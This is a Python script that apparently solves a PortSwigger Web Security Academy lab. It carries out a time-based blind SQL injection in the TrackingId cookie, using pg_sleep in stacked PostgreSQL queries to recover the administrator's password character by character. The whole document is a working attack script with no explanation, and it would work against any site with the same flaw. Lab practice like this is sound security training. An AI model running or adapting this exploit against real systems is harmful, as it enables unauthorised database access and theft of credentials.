from pwn import log
import requests
abc = 'abcdefghijklmnopqrstuvwxyz0123456789'
url = "https://acbc1f811f8fd8af802b7a9800bc00d8.web-security-academy.net/"

s = requests.Session()
password = ""
p1 = log.progress("Password")
p2 = log.progress("Trying")
for p in range(20):
    for a in abc:
        r = s.get(url, cookies={"TrackingId":"TIM9NdKmwTUJUYxT'%3B SELECT CASE WHEN ('"+a+"'=SUBSTRING(password,"+str(p+1)+",1)) THEN pg_sleep(3) ELSE pg_sleep(0) END from users where username='administrator'--", "session":"0iw1Ot3SXZodtYvilWtYeuySiejt9iW6"})
        p2.status("pos: "+ str(p+1)+ " letter: " + str(a)+" time: "+str(r.elapsed.total_seconds()))
        if r.elapsed.total_seconds() > 3 :
            password += a
            break
    p1.status(password)    
p1.success(password)
